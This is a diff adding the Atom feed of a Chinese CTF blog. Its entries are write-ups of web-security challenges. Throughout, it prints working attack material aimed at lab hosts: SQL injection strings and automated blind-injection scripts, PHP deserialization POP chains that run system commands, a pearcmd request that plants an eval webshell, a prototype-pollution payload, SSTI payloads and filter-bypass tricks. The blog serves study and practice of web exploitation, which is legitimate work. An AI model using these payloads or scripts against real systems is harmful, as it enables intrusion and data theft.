@@ -1,0 +1,680 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://NaCl1.github.io</id>
+    <title>NaCl1</title>
+    <updated>2024-01-04T16:33:42.135Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://NaCl1.github.io"/>
+    <link rel="self" href="https://NaCl1.github.io/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://NaCl1.github.io/images/avatar.png</logo>
+    <icon>https://NaCl1.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, NaCl1</rights>
+    <entry>
+        <title type="html"><![CDATA[php对目录查找的一个小特性 #[BSidesCF 2020]Had a bad day]]></title>
+        <id>https://NaCl1.github.io/post/php-dui-mu-lu-cha-zhao-de-yi-ge-xiao-te-xing-bsidescf-2020had-a-bad-day/</id>
+        <link href="https://NaCl1.github.io/post/php-dui-mu-lu-cha-zhao-de-yi-ge-xiao-te-xing-bsidescf-2020had-a-bad-day/">
+        </link>
+        <updated>2024-01-04T16:29:38.000Z</updated>
+        <content type="html"><![CDATA[<p>pyaload:</p>
+<pre><code>http://f4d77f5a-e913-4218-b123-c35e8c15892d.node5.buuoj.cn:81/index.php?category=php://filter/read/convert.base64-encode/woofers/resource=flag
+</code></pre>
+<p>这里由于传入的参数必须包含一个<code>woofers</code><br>
+原本伪协议应该写为<br>
+php://filter/read/convert.base64-encode/woofers/resource=flag<br>
+由于php特性,这里插入的woofers并不会导致包含失败</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[一道有趣的sql注入+php反序列化]]></title>
+        <id>https://NaCl1.github.io/post/yi-dao-you-qu-de-sql-zhu-ru-php-fan-xu-lie-hua/</id>
+        <link href="https://NaCl1.github.io/post/yi-dao-you-qu-de-sql-zhu-ru-php-fan-xu-lie-hua/">
+        </link>
+        <updated>2024-01-04T15:38:53.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="网鼎杯-2018fakebook">[网鼎杯 2018]Fakebook</h1>
+<p>题目并不难,但是将反序列化和sql注入结合起来,之前做过的大多数是单只考虑某个类型</p>
+<p>首先扫描目录会发现一个备份文件泄露<br>
+user.php.bak</p>
+<pre><code class="language-php">&lt;?php
+
+
+class UserInfo
+{
+    public $name = &quot;&quot;;
+    public $age = 0;
+    public $blog = &quot;&quot;;
+
+    public function __construct($name, $age, $blog)
+    {
+        $this-&gt;name = $name;
+        $this-&gt;age = (int)$age;
+        $this-&gt;blog = $blog;
+    }
+
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+
+    public function getBlogContents ()
+    {
+        return $this-&gt;get($this-&gt;blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this-&gt;blog;
+        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+    }
+
+}
+</code></pre>
+<p>基本上可以猜测到可能有反序列化漏洞</p>
+<p><strong>注:</strong> 其实这个网站用于获取某用户博客网站的网页内容,且使用curl来获取,这可能造成ssrf</p>
+<p>在join界面随便注册一个账号<br>
+<img src="https://NaCl1.github.io/post-images/1704382946375.png" alt="" loading="lazy"><br>
+之后登录到这个页面<br>
+<img src="https://NaCl1.github.io/post-images/1704383015757.png" alt="" loading="lazy"><br>
+很容易发现这里存在一个sql注入点:</p>
+<pre><code class="language-url">http://node4.anna.nssctf.cn:28197/view.php?no=1
+</code></pre>
+<p>稍微测试一下就可以注入</p>
+<p>http://node4.anna.nssctf.cn:28197/view.php?no=-1/<strong>/union/</strong>/select/<strong>/1,2,3,4/</strong>/from/**/fakebook.users#<br>
+<img src="https://NaCl1.github.io/post-images/1704383497523.png" alt="" loading="lazy"><br>
+这里的报错就很重要了<br>
+这说明3,4两个位置是要传入一个对象的序列化内容,之后程序会对其进行反序列化<br>
+如此一来,就造成了反序列化漏洞<br>
+exp:</p>
+<pre><code class="language-php">&lt;?php
+class UserInfo
+{
+    public $name = &quot;nacl&quot;;
+    public $age = 0;
+    public $blog = &quot;file:///var/www/html/flag.php&quot;;
+
+}
+$nacl = new UserInfo();
+echo serialize($nacl);
+</code></pre>
+<p>这里ssrf获取flag.php的内容<br>
+payload:</p>
+<pre><code>http://node4.anna.nssctf.cn:28197/view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;nacl&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}'#
+</code></pre>
+<p>注意引号包裹序列内容<br>
+查看网页源代码就可以看见curl下来的内容,(需要点进去或者base64解码)</p>
+<pre><code class="language-php">&lt;?php
+$flag = &quot;NSSCTF{efcfe0cc-79d1-4154-b2b9-19543f7f1132}&quot;;
+exit(0);
+</code></pre>
+<p>总结:<br>
+这题关键在于仔细观擦每一个报错,这是必要的</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[2023/12/09 小记]]></title>
+        <id>https://NaCl1.github.io/post/20231209-xiao-ji/</id>
+        <link href="https://NaCl1.github.io/post/20231209-xiao-ji/">
+        </link>
+        <updated>2023-12-09T16:57:50.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="关于mysql">关于mysql</h2>
+<p><strong>mysql中的<code>||</code>符也可以是连接字符串!?</strong></p>
+<pre><code>我们知道默认情况下在MySQL中|| 运算符是逻辑或运算符（即or），但取决于PIPES_AS_CONCAT SQL模式。如果启用了set sql_mode=pipes_as_concat模式，则 || 运算符用作字符串连接，这和Oracle数据库是一样的，即用作CONCAT()函数的同义词。
+
+插入：concat可以连接多个字符串如concat('id','name',','user')等。
+</code></pre>
+<p><strong>启用方法:</strong></p>
+<pre><code class="language-sql">set sql_mode=pipes_as_concat;
+</code></pre>
+<h3 id="举个栗子">举个栗子:</h3>
+<p>有以下sql语句:                  ([SUCTF 2019]EasySQL 1)</p>
+<pre><code class="language-sql">sql=&quot;select post['query'] || flag from Flag&quot;;
+</code></pre>
+<p>payload:    query=1;set sql_mode=pipes_as_concat;select 1</p>
+<blockquote>
+<p>与此无关的一个payload:     query=*,1</p>
+</blockquote>
+<p><strong>一篇sql注入流程不错的文章</strong>:      https://blog.csdn.net/qq_46918279/article/details/120188186</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[2023/12/08 小记]]></title>
+        <id>https://NaCl1.github.io/post/20231208-xiao-ji/</id>
+        <link href="https://NaCl1.github.io/post/20231208-xiao-ji/">
+        </link>
+        <updated>2023-12-08T15:56:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="针对与linux操作系统rce空格绕过如下">针对与Linux操作系统rce空格绕过如下</h2>
+<pre><code>    cat${IFS}flag.txt
+    cat$IFS$9flag.txt
+    cat&lt;flag.txt
+    cat&lt;&gt;flag.txt
+    ca\t fl\ag
+    kg=$ '\x20flag.txt' &amp;&amp;cat$kg              **新学一招**
+    (\x20 转换成字符串就是空格，这里通过变量的方式巧妙绕过)
+</code></pre>
+<h2 id="关于php-中include函数的特性">关于php 中include()函数的特性</h2>
+<p>根据include函数的功能，以字符‘/’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘/’后面的文件--注意是最后一个/。<br>
+例子:</p>
+<pre><code>    include(qwert/flag.php);       //若qwert不存在当前目录而flag.php存在当前录,这会包含flag.php
+</code></pre>
+<h2 id="关于mysql语法">关于mysql语法</h2>
+<pre><code>    当某字段名为纯数字时, 在使用时要用反引号包裹起来
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JavaScript原型链污染]]></title>
+        <id>https://NaCl1.github.io/post/javascript-yuan-xing-lian-wu-ran/</id>
+        <link href="https://NaCl1.github.io/post/javascript-yuan-xing-lian-wu-ran/">
+        </link>
+        <updated>2023-12-02T12:50:22.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>关于js原型链</strong>: https://www.yuque.com/cnily03/tech/js-prototype-pollution</p>
+<h1 id="buu-newstarctf-2023-week3-otenkigirl">buu NewStarCTF 2023 week3 OtenkiGirl</h1>
+<p>主要审计附件中 info.js和submit.js<br>
+submit用于提交表单,而info用于获取提交后的数据</p>
+<p>submit.js部分代码:</p>
+<pre><code class="language-js">const merge = (dst, src) =&gt; {
+    if (typeof dst !== &quot;object&quot; || typeof src !== &quot;object&quot;) return dst;
+    for (let key in src) {
+        if (key in dst &amp;&amp; key in src) {
+            dst[key] = merge(dst[key], src[key]);
+        } else {
+            dst[key] = src[key];
+        }
+    }
+    return dst;
+}
+
+router.post(&quot;/submit&quot;, async (ctx) =&gt; {
+    if (ctx.header[&quot;content-type&quot;] !== &quot;application/json&quot;)
+        return ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Content-Type must be application/json&quot;
+        }
+
+    const jsonText = ctx.request.rawBody || &quot;{}&quot;
+    try {
+        const data = JSON.parse(jsonText);
+        if (typeof data[&quot;contact&quot;] !== &quot;string&quot; || typeof data[&quot;reason&quot;] !== &quot;string&quot;)
+            return ctx.body = {
+                status: &quot;error&quot;,
+                msg: &quot;Invalid parameter&quot;
+            }
+        if (data[&quot;contact&quot;].length &lt;= 0 || data[&quot;reason&quot;].length &lt;= 0)
+            return ctx.body = {
+                status: &quot;error&quot;,
+                msg: &quot;Parameters contact and reason cannot be empty&quot;
+            }
+
+        const DEFAULT = {
+            date: &quot;unknown&quot;,
+            place: &quot;unknown&quot;
+        }
+        const result = await insert2db(merge(DEFAULT, data));
+        ctx.body = {
+            status: &quot;success&quot;,
+            data: result
+        };
+    } catch (e) {
+        console.error(e);
+        ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Internal Server Error&quot;
+        }
+    }
+})
+</code></pre>
+<p>info.js部分代码</p>
+<pre><code class="language-js">async function getInfo(timestamp) {
+    timestamp = typeof timestamp === &quot;number&quot; ? timestamp : Date.now();
+    // Remove test data from before the movie was released
+    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
+   // DEFAULT_CONFIG
+    timestamp = Math.max(timestamp, minTimestamp);
+    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).catch(e =&gt; { throw e });
+    return data;
+}
+
+router.post(&quot;/info/:ts?&quot;, async (ctx) =&gt; {
+    if (ctx.header[&quot;content-type&quot;] !== &quot;application/x-www-form-urlencoded&quot;)
+        return ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Content-Type must be application/x-www-form-urlencoded&quot;
+        }
+    if (typeof ctx.params.ts === &quot;undefined&quot;) ctx.params.ts = 0
+    const timestamp = /^[0-9]+$/.test(ctx.params.ts || &quot;&quot;) ? Number(ctx.params.ts) : ctx.params.ts;
+    if (typeof timestamp !== &quot;number&quot;)
+        return ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Invalid parameter ts&quot;
+        }
+
+    try {
+        const data = await getInfo(timestamp).catch(e =&gt; { throw e });
+        ctx.body = {
+            status: &quot;success&quot;,
+            data: data
+        }
+    } catch (e) {
+        console.error(e);
+        return ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Internal Server Error&quot;
+        }
+    }
+})
+</code></pre>
+<p>info.js中的merge函数存在原型链污染漏洞</p>
+<pre><code class="language-js">dst[key] = src[key];
+</code></pre>
+<p><strong>注:</strong> 在submit.js中</p>
+<pre><code class="language-js">const data = JSON.parse(jsonText);
+</code></pre>
+<p>这会使data的___proto___指向Object.prototype</p>
+<blockquote>
+<p>根据JavaScript的语言规范，通过JSON.parse()方法创建的对象的原型是Object.prototype<br>
+在config.default.js中,可以发现我们需要污染的min_public_time正是在Object类下,即min_public_time定义在Object.prototype中</p>
+</blockquote>
+<h3 id="构造污染paylopad">构造污染paylopad:</h3>
+<pre><code class="language-json">{&quot;date&quot;:&quot;111&quot;,&quot;place&quot;:&quot;222&quot;,&quot;contact&quot;:&quot;333&quot;,&quot;reason&quot;:&quot;111&quot;,
+&quot;__proto__&quot;:{
+&quot;min_public_time&quot;: &quot;1001-01-01&quot;
+},
+&quot;timestamp&quot;:1701522611184}
+</code></pre>
+<p>提交后访问/info/0即可得到flag<br>
+<strong>太难了555 qwq</strong></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[sqli-labs]]></title>
+        <id>https://NaCl1.github.io/post/sqli-labs/</id>
+        <link href="https://NaCl1.github.io/post/sqli-labs/">
+        </link>
+        <updated>2023-11-08T06:56:40.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="less-1">Less-1</h1>
+<pre><code>?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'%23
+</code></pre>
+<p>Your Login name:emails,referers,uagents,users<br>
+Your Password:3<br>
+普通的字符型联合注入</p>
+<pre><code>?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'%23
+</code></pre>
+<p>Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password<br>
+Your Password:3</p>
+<pre><code>?id=-1' union select 1,group_concat(id,username,password),3 from security.users%23
+</code></pre>
+<h1 id="less-2">Less-2</h1>
+<p>和Less-1 几乎相同</p>
+<pre><code>http://sql-labs/Less-1/
+?id=-1' union select 1,2,group_concat(id,username,password) from security.users%23
+</code></pre>
+<h1 id="less-3">Less-3</h1>
+<p>输入: ?id=1'<br>
+........for the right syntax to use near ''1'') LIMIT 0,1' at line 1<br>
+关键在: <code>'  '1'') LIMIT 0,1 '</code><br>
+系统给输入的内容增加了一个<code>')</code></p>
+<pre><code>?id=-1') union select 1,2,database()%23
+</code></pre>
+<p>其余步骤与前几关相同</p>
+<h1 id="less-4">Less-4</h1>
+<p>输入单引号并不报错,而输入双引号会报错<br>
+与Less-3 类似,只不过使用了<code>&quot;)</code>包裹字符</p>
+<pre><code>?id=-1&quot;) union select 1,2,3%23
+</code></pre>
+<h1 id="less-5">Less-5</h1>
+<p>没有回显username,报错注入秒了</p>
+<pre><code>?id=-1' and updatexml(1,concat(0x7e,database(),0x7e),1)%23
+</code></pre>
+<p>看网上还有用group by 双查询注入的</p>
+<h1 id="less-6">Less-6</h1>
+<p>Less-5的单引号闭合改为双引号</p>
+<pre><code>?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)%23
+</code></pre>
+<p>也可以用extractvalue</p>
+<pre><code>?id=1&quot; and extractvalue(1,concat(0x7e,database()))%23
+</code></pre>
+<pre><code>?id=1&quot; and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))%23
+</code></pre>
+<h1 id="less-7">Less-7</h1>
+<p>这关用<code>(('  '))</code>包裹变量<br>
+测试:</p>
+<pre><code>?id=1')) and sleep(5)%23
+</code></pre>
+<p>这里很明显可以使用时间注入<br>
+不过测试了一下发现布尔盲注也是可以的</p>
+<pre><code>?id=1')) and ascii(substr(database(),1,1))&gt;1%23
+</code></pre>
+<p>不够应该都是非预期,网上还有另一种方法,正是使用提示中的<code>outfile</code><br>
+<strong>文件上传</strong><br>
+需要更改mysql的配置文件,将 secure-file-priv 置为空,即</p>
+<pre><code>secure-file-priv=
+</code></pre>
+<p>之后编写payload:<br>
+1')) union select 1,2,database() into outfile '文件要被保存的路径'%23</p>
+<h1 id="less-8">Less-8</h1>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[php反序列化之fast destruct]]></title>
+        <id>https://NaCl1.github.io/post/php-fan-xu-lie-hua-zhi-fast-destruct/</id>
+        <link href="https://NaCl1.github.io/post/php-fan-xu-lie-hua-zhi-fast-destruct/">
+        </link>
+        <updated>2023-10-31T15:00:35.000Z</updated>
+        <content type="html"><![CDATA[<p>参考:<br>
+https://zhuanlan.zhihu.com/p/405838002<br>
+按照网上的所说,fast destruct有两种最常见的方法</p>
+<ol>
+<li>修改成员属性个数</li>
+<li>去掉末尾的<code>}</code></li>
+</ol>
+<h1 id="newstar2023-week4-more-fast">newstar2023 week4 More Fast</h1>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+
+class Start{
+    public $errMsg;
+    public function __destruct() {
+        die($this-&gt;errMsg);
+    }
+}
+
+class Pwn{
+    public $obj;
+    public function __invoke(){
+        $this-&gt;obj-&gt;evil();
+    }
+    public function evil() {
+        phpinfo();
+    }
+}
+
+class Reverse{
+    public $func;
+    public function __get($var) {
+        ($this-&gt;func)();
+    }
+}
+
+class Web{
+    public $func;
+    public $var;
+    public function evil() {
+        if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var)){
+            ($this-&gt;func)($this-&gt;var);
+        }else{
+            echo &quot;Not Flag&quot;;
+        }
+    }
+}
+
+class Crypto{
+    public $obj;
+    public function __toString() {
+        $wel = $this-&gt;obj-&gt;good;
+        return &quot;NewStar&quot;;
+    }
+}
+
+class Misc{
+    public function evil() {
+        echo &quot;good job but nothing&quot;;
+    }
+}
+$nacl = new Start();
+$nacl-&gt;errMsg = new Crypto();
+$nacl-&gt;errMsg-&gt;obj = new Reverse();
+$nacl-&gt;errMsg-&gt;obj-&gt;func = new pwn();
+$nacl-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = new web();
+$nacl-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;func = &quot;system&quot;;
+$nacl-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;var = &quot;cat /f*&quot;;
+echo serialize($nacl);
+</code></pre>
+<p>将得到的payload去掉结尾的一个花括号<code>}</code>即可<br>
+修改后:</p>
+<pre><code>O:5:&quot;Start&quot;:1:{s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:{s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:{s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:{s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:{s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;}}}}
+</code></pre>
+<p>贴一下官方的payload:</p>
+<pre><code class="language-php">$obj = new Start;
+$obj -&gt; errMsg = new Crypto;
+$obj -&gt; errMsg -&gt; obj = new Reverse;
+$obj -&gt; errMsg -&gt; obj -&gt; func = new Pwn;
+$obj -&gt; errMsg -&gt; obj -&gt; func -&gt; obj = new Web;
+$obj -&gt; errMsg -&gt; obj -&gt; func -&gt; obj -&gt; func = &quot;system&quot;;
+$obj -&gt; errMsg -&gt; obj -&gt; func -&gt; obj -&gt; var = &quot;cat /f*ag&quot;;
+$a[0] = $obj;
+$a[1] = NULL;
+echo str_replace(&quot;i:0&quot;,&quot;i:1&quot;,serialize($a));
+// a:2:{i:1;O:5:&quot;Start&quot;:1:{s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:{s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:{s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:{s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:{s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /f*ag&quot;;}}}}}i:1;N;}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[newstar week3 week 4 复现]]></title>
+        <id>https://NaCl1.github.io/post/newstar-week3-fu-xian_new/</id>
+        <link href="https://NaCl1.github.io/post/newstar-week3-fu-xian_new/">
+        </link>
+        <updated>2023-10-30T16:47:32.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="include">Include 🍐</h1>
+<p>参考:<br>
+https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNDAyNTgsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODEzOTk1OCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMjk0NzkyOX0.Vio4IE1jKcRPrrX-vwzIKZdUDJS8hrY3uBXDFNOjya0</p>
+<p>poc:</p>
+<pre><code class="language-http">GET /?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php HTTP/1.1
+Host: a24e84f3-68fc-43df-b978-723e45ee27eb.node4.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://a24e84f3-68fc-43df-b978-723e45ee27eb.node4.buuoj.cn:81/
+Upgrade-Insecure-Requests: 1
+
+</code></pre>
+<pre><code class="language-http">POST /?file=/tmp/cmd HTTP/1.1
+Host: a24e84f3-68fc-43df-b978-723e45ee27eb.node4.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://a24e84f3-68fc-43df-b978-723e45ee27eb.node4.buuoj.cn:81/
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+0=system(&quot;cat /flag&quot;);
+</code></pre>
+<h1 id="medium_sql">medium_sql</h1>
+<p>bool注入<br>
+exp:</p>
+<pre><code class="language-python">import requests
+import time
+flag = ''
+host = &quot;http://68a466eb-e069-43b9-8837-1324a36073f0.node4.buuoj.cn:81/&quot;
+#TMP0919'anD/**/Ascii(suBstr((seleCt/**/DatAbase()),1,1))&gt;1%23
+#sql = &quot;('c')&quot;
+#sql = &quot;(database())&quot;
+#sql = &quot;(selEct(gRoup_concAt(tAble_nAMe))fRom(infOrmAtion_scHeMa.taBles)wHeRe(tAbLe_schEMa=database()))&quot;
+#sql = &quot;(selEct(gRoup_concAt(ColuMn_nAMe))fRom(infOrmAtion_scHeMa.COLuMns)wHeRe(tAbLe_NAme='here_is_flag'))&quot;
+sql = &quot;(seLeCt(gRoup_concat(flag))fRom(ctf.here_is_flag))&quot;
+for i in range(1,1000):
+    min = 32
+    max = 128
+    mid = (min + max)//2
+    while(min &lt; max):
+        payload = host + &quot;?id=TMP0919'anD/**/(Ascii(suBstr(&quot;+ sql +&quot;,{},1))&gt;{})--+&quot;.format(i,mid)
+        res = requests.get(url=payload)
+        time.sleep(0.05)
+        if 'not exists' in res.text:
+            max = mid
+        else:
+            min = mid + 1
+        mid = (min + max)//2
+    if mid &lt;= 32 or mid &gt;= 127:
+        break
+    flag = flag+chr(mid)
+    print(flag)
+
+</code></pre>
+<p>得到flag: flag{81f5bcaa-3a67-47a5-9dfd-30e7943c818d}</p>
+<p>贴一下尝试使用sqlmap来解这题:</p>
+<pre><code>sqlmap -u 'http://1c69bd84-56b0-45d6-a27f-f9023db1fc6e.node4.buuoj.cn:81/?id=TMP0919' -D 'ctf' -T 'here_is_flag' -C 'flag'  --dump --delay 0.05 --technique=B
+</code></pre>
+<h1 id="week4-midsql">week4 midsql</h1>
+<p>时间注入</p>
+<pre><code class="language-python">import requests
+import time
+url = 'http://945d5f79-e276-4699-abaf-f770b3af1531.node4.buuoj.cn:81/'
+#sql = '?id=1/**/and/**/if(ascii(substr((select/**/database()),{},1))&gt;{},sleep(2),1);'
+#sql = '?id=1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),{},1))&gt;{},sleep(1),1);'
+# id,name,price   
+sql = '?id=1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),{},1))&gt;{},sleep(1),1);'
+#items
+#sql = '?id=1/**/and/**/if(ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),{},1))&gt;{},sleep(1),1);'
+
+flag = ''
+for i in range(1000):
+    min = 32
+    max = 128
+    mid = (min + max) // 2
+    while(min &lt; max):
+        payload = url + sql.format(i, mid)
+        time1 = time.time()
+        res = requests.get(url=payload)
+        if time.time() - time1 &gt; 1:
+            min = mid + 1
+        else:
+            max = mid
+        mid = (min + max) // 2
+        if mid &lt;=32 or mid &gt;= 127:
+            break
+    flag = flag + chr(mid)
+    print(flag)
+
+</code></pre>
+<h1 id="week4-逃">week4 逃</h1>
+<p>反序列化字符串逃逸<br>
+https://blog.csdn.net/qq_53856457/article/details/124764427<br>
+payload:</p>
+<pre><code>http://bcf15483-330f-4b66-aeaa-5f36c6e55f8a.node4.buuoj.cn:81/?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ssti漏洞]]></title>
+        <id>https://NaCl1.github.io/post/ssti-lou-dong/</id>
+        <link href="https://NaCl1.github.io/post/ssti-lou-dong/">
+        </link>
+        <updated>2023-10-26T11:16:31.000Z</updated>
+        <content type="html"><![CDATA[<p>曾经在sharkctf中做出来过一道ssti漏洞,但也是囫囵吞枣,对payload的理解并不很透彻,<br>
+故在此整理<br>
+关于ssti漏洞,参考了以下文章:<br>
+https://zhuanlan.zhihu.com/p/619441473<br>
+https://www.ngui.cc/el/3892559.html?action=onClick</p>
+<p>理解后发现ssti并不是很难,只需要找到可用的魔术方法,一层层调用直到达到命令执行或者代码执行</p>
+<h2 id="newstarctf2023-week3genshin">newstarctf2023 week3GenShin</h2>
+<p>首先我们要在http返回包的包头中找到<code>/secr3tofpop</code>这个目录<br>
+访问后,传入name参数的值就会被显示出来<br>
+这里就造成了ssti, 也可以看见后端为jinja2模板<br>
+尝试传入{{}},发现被过滤了,根据文章中所描述的,我们可以使用{%%}来绕过<br>
+之后就是调用类下的方法<br>
+事实上,可以构造以下语句来查找可以利用的方法</p>
+<pre><code>{%for i in XXX:%}{%if xxx%}{%print(i)%}{%endif%}{%endfor%}
+</code></pre>
+<p>这里过滤了很多函数,官方给出的payload:</p>
+<pre><code>{% print(get_flashed_messages.__globals__.os[&quot;pop&quot;+&quot;en&quot;](&quot;cat /flag&quot;).read()) %}
+</code></pre>
+<h2 id="ciscn-2019华东南web11">[CISCN 2019华东南]Web11</h2>
+<p>页面中有显示ip的地方,添加xff伪造任意ip,会被回显<br>
+构造xff: {{7*7}},ip显示为49,存在xff<br>
+这里后端使用了php的smarty模板,可以直接在{{}}里执行php代码,payload:<br>
+添加http请求头:      X-Forwarded-For: {{cat /flag}}</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[FSCTF部分题解]]></title>
+        <id>https://NaCl1.github.io/post/fsctf-bu-fen-ti-jie/</id>
+        <link href="https://NaCl1.github.io/post/fsctf-bu-fen-ti-jie/">
+        </link>
+        <updated>2023-10-25T15:42:12.000Z</updated>
+        <content type="html"><![CDATA[<p>http://userb1ank.xyz/2023/10/25/wp/FSCTF%E5%A4%8D%E7%8E%B0/</p>
+<h2 id="ez_eval">EZ_eval</h2>
+<pre><code>&lt;?php
+    if(isset($_GET['word'])){
+    $word = $_GET['word'];
+    if (preg_match(&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;, $word)){
+       die(&quot;nonono.&quot;);
+    }
+    $word = str_replace(&quot;?&quot;, &quot;&quot;, $word);
+    eval(&quot;?&gt;&quot;. $word);
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<h3 id="基础知识">基础知识</h3>
+<p><strong>PHP 标签</strong></p>
+<pre><code>&lt;? ?&gt;
+&lt;?php ?&gt;
+&lt;?= ?&gt; 
+&lt;script language='php'&gt; &lt;/script&gt;
+</code></pre>
+<p>其中，<? ?>相当于对<?php ?>的替换。而<?= ?>则是相当于<?php echo ... ?>。例如：</p>
+<?='Hello World'?>    // 输出 "Hello World"
+<p><strong>PHP 中的反引号</strong><br>
+PHP中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用 echo 等函数：</p>
+<pre><code>&lt;?php echo `ls /`;?&gt;
+</code></pre>
+<p>还可以使用<?= ?>短标签（比较灵活）：</p>
+<pre><code>&lt;?= `ls /`?&gt;
+</code></pre>
+<p><strong>通配符在 RCE 中的利用</strong><br>
+先说一下原理：</p>
+<p>在正则表达式中，?这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或一次。</p>
+<p>在 Shell 命令行中，?这样的通配符与其它字符一起组合成表达式，匹配任意一个字符。</p>
+<p>同理，我们可以知道*通配符：</p>
+<p>在正则表达式中，*这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或多次。</p>
